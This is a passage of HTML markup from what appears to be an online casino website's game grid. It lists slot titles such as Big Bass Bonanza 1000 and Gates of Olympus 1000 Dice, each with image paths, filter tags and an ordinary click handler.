                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Cash Surge" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Cash Surge', '/assets/games/i/165x220/d46bfc95df66fa14eee290601d9c16e1.webp?v=0.1' , 'vswayscashsurg', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d46bfc95df66fa14eee290601d9c16e1.webp?v=0.1" src="/assets/games/i/165x220/d46bfc95df66fa14eee290601d9c16e1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Cash Surge">Cash Surge</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Bonanza 1000" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Bonanza 1000', '/assets/games/i/165x220/c1c8b3b5ed57a47a2d0f60a52f1bb363.webp?v=0.1' , 'vs10bbbnz1000', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c1c8b3b5ed57a47a2d0f60a52f1bb363.webp?v=0.1" src="/assets/games/i/165x220/c1c8b3b5ed57a47a2d0f60a52f1bb363.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Bonanza 1000">Big Bass Bonanza 1000</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Lions Reborn" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Lions Reborn', '/assets/games/i/165x220/59084da9fd84151a4a2259d2059517e2.webp?v=0.1' , 'vsways5lionsr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/59084da9fd84151a4a2259d2059517e2.webp?v=0.1" src="/assets/games/i/165x220/59084da9fd84151a4a2259d2059517e2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Lions Reborn">5 Lions Reborn</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ride The Lightning" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ride The Lightning', '/assets/games/i/165x220/7a9d4f999e47ffdc599121c85f7b994c.webp?v=0.1' , 'vs9ridelightng', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7a9d4f999e47ffdc599121c85f7b994c.webp?v=0.1" src="/assets/games/i/165x220/7a9d4f999e47ffdc599121c85f7b994c.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ride The Lightning">Ride The Lightning</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Joker’s Jewels Cash" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Joker’s Jewels Cash', '/assets/games/i/165x220/4c93298df2e54a988159a4b3a0a749ad.webp?v=0.1' , 'vs5jokerjc', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4c93298df2e54a988159a4b3a0a749ad.webp?v=0.1" src="/assets/games/i/165x220/4c93298df2e54a988159a4b3a0a749ad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Joker’s Jewels Cash">Joker’s Jewels Cash</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bandit Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bandit Megaways', '/assets/games/i/165x220/d62597637f4cc3a94bbedbc2081c817d.webp?v=0.1' , 'vswaysbandit', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d62597637f4cc3a94bbedbc2081c817d.webp?v=0.1" src="/assets/games/i/165x220/d62597637f4cc3a94bbedbc2081c817d.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bandit Megaways">Bandit Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Fruit Party Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Fruit Party Dice', '/assets/games/i/165x220/d37914e1dc379fef66f50b6e3538309c.webp?v=0.2' , 'vs20fpartydice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d37914e1dc379fef66f50b6e3538309c.webp?v=0.2" src="/assets/games/i/165x220/d37914e1dc379fef66f50b6e3538309c.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Fruit Party Dice">Fruit Party Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Blitz Super Wheel" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Blitz Super Wheel', '/assets/games/i/165x220/30460ebdbaf2f0ddcc8d6fdadeed7f7a.webp?v=0.1' , 'vs20lightblitz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/30460ebdbaf2f0ddcc8d6fdadeed7f7a.webp?v=0.1" src="/assets/games/i/165x220/30460ebdbaf2f0ddcc8d6fdadeed7f7a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Blitz Super Wheel">Blitz Super Wheel</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Book of Monsters" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Book of Monsters', '/assets/games/i/165x220/df9d21f5a0af1e406074d461face3681.webp?v=0.1' , 'vs20fatbook', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/df9d21f5a0af1e406074d461face3681.webp?v=0.1" src="/assets/games/i/165x220/df9d21f5a0af1e406074d461face3681.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Book of Monsters">Book of Monsters</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="The Dog House - Royal Hunt" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'The Dog House - Royal Hunt', '/assets/games/i/165x220/c80700274a8f22debbe104cb748a3b8b.webp?v=0.1' , 'vs20dhsuper', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/c80700274a8f22debbe104cb748a3b8b.webp?v=0.1" src="/assets/games/i/165x220/c80700274a8f22debbe104cb748a3b8b.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="The Dog House - Royal Hunt">The Dog House - Royal Hunt</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Volcano Goddess" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Volcano Goddess', '/assets/games/i/165x220/4550dc5417d85268a50ffe650ee1efa5.webp?v=0.2' , 'vswaysvlcgds', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4550dc5417d85268a50ffe650ee1efa5.webp?v=0.2" src="/assets/games/i/165x220/4550dc5417d85268a50ffe650ee1efa5.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Volcano Goddess">Volcano Goddess</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Triple Pot Gold" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Triple Pot Gold', '/assets/games/i/165x220/8483ba95a53ec51f739963bf08a51b2c.webp?v=0.2' , 'vswaysasiatrzn', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/8483ba95a53ec51f739963bf08a51b2c.webp?v=0.2" src="/assets/games/i/165x220/8483ba95a53ec51f739963bf08a51b2c.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Triple Pot Gold">Triple Pot Gold</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Dice', '/assets/games/i/165x220/d91231ddaa1014ca7c48a698a8f198aa.webp?v=0.1' , 'vs10bbdice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d91231ddaa1014ca7c48a698a8f198aa.webp?v=0.1" src="/assets/games/i/165x220/d91231ddaa1014ca7c48a698a8f198aa.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Dice">Big Bass Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Lucky’s Wild Pub" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Lucky’s Wild Pub', '/assets/games/i/165x220/605156664d5807f02b72218c3ca4acec.webp?v=0.1' , 'vs25luckwildpb', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/605156664d5807f02b72218c3ca4acec.webp?v=0.1" src="/assets/games/i/165x220/605156664d5807f02b72218c3ca4acec.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Lucky’s Wild Pub">Lucky’s Wild Pub</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Joker" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Joker', '/assets/games/i/165x220/2450d97e9985b18f48b3b82a92aa2b36.webp?v=0.2' , 'vswayswwjoker', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/2450d97e9985b18f48b3b82a92aa2b36.webp?v=0.2" src="/assets/games/i/165x220/2450d97e9985b18f48b3b82a92aa2b36.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Joker">Wild Wild Joker</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Raging Waterfall Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Raging Waterfall Megaways™', '/assets/games/i/165x220/46f5e6c3f9685c4002879bc6216e3ca4.webp?v=0.1' , 'vswaysmltchmgw', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/46f5e6c3f9685c4002879bc6216e3ca4.webp?v=0.1" src="/assets/games/i/165x220/46f5e6c3f9685c4002879bc6216e3ca4.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Raging Waterfall Megaways™">Raging Waterfall Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Greedy Fortune Pig" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Greedy Fortune Pig', '/assets/games/i/165x220/4466e740e68eadcee84b220e7c217743.webp?v=0.1' , 'vs10fortnpig', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4466e740e68eadcee84b220e7c217743.webp?v=0.1" src="/assets/games/i/165x220/4466e740e68eadcee84b220e7c217743.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Greedy Fortune Pig">Greedy Fortune Pig</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Sweet Bonanza 1000 Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Sweet Bonanza 1000 Dice', '/assets/games/i/165x220/17f88ecf61b2406abc4ea76755ee4430.webp?v=0.1' , 'vs20swdicex', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/17f88ecf61b2406abc4ea76755ee4430.webp?v=0.1" src="/assets/games/i/165x220/17f88ecf61b2406abc4ea76755ee4430.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Sweet Bonanza 1000 Dice">Sweet Bonanza 1000 Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="5 Lions Megaways™ 2" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    '5 Lions Megaways™ 2', '/assets/games/i/165x220/dee7ee62396d95878a00235dac787f9f.webp?v=0.1' , 'vsways5lions2', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/dee7ee62396d95878a00235dac787f9f.webp?v=0.1" src="/assets/games/i/165x220/dee7ee62396d95878a00235dac787f9f.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="5 Lions Megaways™ 2">5 Lions Megaways™ 2</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Gates of Olympus 1000 Dice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Gates of Olympus 1000 Dice', '/assets/games/i/165x220/1d81432572d5fc69e8cf04d09b498b87.webp?v=0.1' , 'vs20dicegatex', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/1d81432572d5fc69e8cf04d09b498b87.webp?v=0.1" src="/assets/games/i/165x220/1d81432572d5fc69e8cf04d09b498b87.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Gates of Olympus 1000 Dice">Gates of Olympus 1000 Dice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Peppe’s Pepperoni Pizza Plaza" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Peppe’s Pepperoni Pizza Plaza', '/assets/games/i/165x220/7e70db4b5ecfc46c2807176bd8533404.webp?v=0.1' , 'vswaystonypzz', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/7e70db4b5ecfc46c2807176bd8533404.webp?v=0.1" src="/assets/games/i/165x220/7e70db4b5ecfc46c2807176bd8533404.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Peppe’s Pepperoni Pizza Plaza">Peppe’s Pepperoni Pizza Plaza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Big Bass Return to the Races" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Big Bass Return to the Races', '/assets/games/i/165x220/d4d65253f2b4f96e39b72976dfd0fdf7.webp?v=0.2' , 'vs10bbrttr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/d4d65253f2b4f96e39b72976dfd0fdf7.webp?v=0.2" src="/assets/games/i/165x220/d4d65253f2b4f96e39b72976dfd0fdf7.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Big Bass Return to the Races">Big Bass Return to the Races</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Bigger Bass Splash" data-filter="ALL,NEW,REEL KINGDOM" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Bigger Bass Splash', '/assets/games/i/165x220/3d847f49d770a4d4ae5f47a96d86c90a.webp?v=0.2' , 'vs12bgrbspl', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/3d847f49d770a4d4ae5f47a96d86c90a.webp?v=0.2" src="/assets/games/i/165x220/3d847f49d770a4d4ae5f47a96d86c90a.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Bigger Bass Splash">Bigger Bass Splash</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Savannah Legend" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Savannah Legend', '/assets/games/i/165x220/dc2954d45893555646ba9dc8abd63dec.webp?v=0.1' , 'vswayssavlgnd', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/dc2954d45893555646ba9dc8abd63dec.webp?v=0.1" src="/assets/games/i/165x220/dc2954d45893555646ba9dc8abd63dec.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Savannah Legend">Savannah Legend</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="John Hunter and Galileo’s Secrets" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'John Hunter and Galileo’s Secrets', '/assets/games/i/165x220/ecab9dfc7bcbd92b27b5f1cb4bb2e1ae.webp?v=0.2' , 'vs10booklight', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/ecab9dfc7bcbd92b27b5f1cb4bb2e1ae.webp?v=0.2" src="/assets/games/i/165x220/ecab9dfc7bcbd92b27b5f1cb4bb2e1ae.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="John Hunter and Galileo’s Secrets">John Hunter and Galileo’s Secrets</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Ancient Island Megaways" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Ancient Island Megaways', '/assets/games/i/165x220/e2c8e1ea99e212684eecf749f112cb30.webp?v=0.2' , 'vswaysmodfr', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/e2c8e1ea99e212684eecf749f112cb30.webp?v=0.2" src="/assets/games/i/165x220/e2c8e1ea99e212684eecf749f112cb30.webp?v=0.2" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Ancient Island Megaways">Ancient Island Megaways</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Escape the Pyramid – Fire &amp;quot; Ice" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Escape the Pyramid – Fire &amp;quot; Ice', '/assets/games/i/165x220/4a3c92c58589e539c90ef73f1b748e2a.webp?v=0.1' , 'vs10fireice', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" ls-is-cached lazyloaded" data-src="/assets/games/i/165x220/4a3c92c58589e539c90ef73f1b748e2a.webp?v=0.1" src="/assets/games/i/165x220/4a3c92c58589e539c90ef73f1b748e2a.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Escape the Pyramid – Fire &amp; Ice">Escape the Pyramid – Fire &amp; Ice</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wildebeest Wins" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wildebeest Wins', '/assets/games/i/165x220/bd03a6a2636d7c681164d4454e7d7c09.webp?v=0.1' , 'vswaysbufstamp', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/bd03a6a2636d7c681164d4454e7d7c09.webp?v=0.1" src="/assets/games/i/165x220/bd03a6a2636d7c681164d4454e7d7c09.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wildebeest Wins">Wild Wildebeest Wins</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Irish Crown" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Irish Crown', '/assets/games/i/165x220/242d035c80aa787b4edd281efda190ad.webp?v=0.1' , 'vs20irishcrown', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/242d035c80aa787b4edd281efda190ad.webp?v=0.1" src="/assets/games/i/165x220/242d035c80aa787b4edd281efda190ad.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Irish Crown">Irish Crown</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Wild Wild Pearls" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Wild Wild Pearls', '/assets/games/i/165x220/9cce9ba01f745fbcd3950776e5f3fed2.webp?v=0.1' , 'vswayspearls', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/9cce9ba01f745fbcd3950776e5f3fed2.webp?v=0.1" src="/assets/games/i/165x220/9cce9ba01f745fbcd3950776e5f3fed2.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Wild Wild Pearls">Wild Wild Pearls</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Aztec Gems Megaways™" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Aztec Gems Megaways™', '/assets/games/i/165x220/007ffa5d38a7b06af0e6fdf8f7c6854e.webp?v=0.1' , 'vswaysaztec', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/007ffa5d38a7b06af0e6fdf8f7c6854e.webp?v=0.1" src="/assets/games/i/165x220/007ffa5d38a7b06af0e6fdf8f7c6854e.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Aztec Gems Megaways™">Aztec Gems Megaways™</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mahjong Wins – Gong Xi Fa Cai" data-filter="ALL,TOP,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mahjong Wins – Gong Xi Fa Cai', '/assets/games/i/165x220/09dcce598d653014b6a599e80d86f2b1.webp?v=0.1' , 'vswaysmahwgong', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/09dcce598d653014b6a599e80d86f2b1.webp?v=0.1" src="/assets/games/i/165x220/09dcce598d653014b6a599e80d86f2b1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mahjong Wins – Gong Xi Fa Cai">Mahjong Wins – Gong Xi Fa Cai</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Brick House Bonanza" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Brick House Bonanza', '/assets/games/i/165x220/516d6387d63c58c3bfa789b32c52eda6.webp?v=0.1' , 'vswaysbrickhos', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/516d6387d63c58c3bfa789b32c52eda6.webp?v=0.1" src="/assets/games/i/165x220/516d6387d63c58c3bfa789b32c52eda6.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Brick House Bonanza">Brick House Bonanza</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Floating Dragon Year of the Snake" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Floating Dragon Year of the Snake', '/assets/games/i/165x220/abbaceb82cdfa11f79b184e7983f87f9.webp?v=0.1' , 'vs10fdsnake', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/abbaceb82cdfa11f79b184e7983f87f9.webp?v=0.1" src="/assets/games/i/165x220/abbaceb82cdfa11f79b184e7983f87f9.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Floating Dragon Year of the Snake">Floating Dragon Year of the Snake</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Mining Rush" data-filter="ALL,NEW" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Mining Rush', '/assets/games/i/165x220/2b046948c8dc3908d6f008cb81a8afd1.webp?v=0.1' , 'vs20minerush', '' )" style="">

          <div class="content-wrapper">
              
                                    <img width="120" height="120" class=" lazyloaded" data-src="/assets/games/i/165x220/2b046948c8dc3908d6f008cb81a8afd1.webp?v=0.1" src="/assets/games/i/165x220/2b046948c8dc3908d6f008cb81a8afd1.webp?v=0.1" *ngif="showEle"> <!--/*IMAGE MIN WIDTH MUST BE 146, MAX 6 game-box per row */-->            
                      </div>
          <h5 data-title="Mining Rush">Mining Rush</h5>
        </a>
        
     
                        <a class="col-xs-4 col-md-3 game-box text-center" data-title="Money Stacks Megaways" data-filter="ALL" [ngclass]="{'flex-grow-2' : game.FlexGrow =='2'}" onclick="showGameLinks(event,    'Money Stacks Megaways', '/assets/games/i/165x220/fe1766c9bce2f13459e65c80feca0e35.webp?v=0.1' , 'vswaysbblitz', '' )" style="">

          <div class="content-wrapper">
              
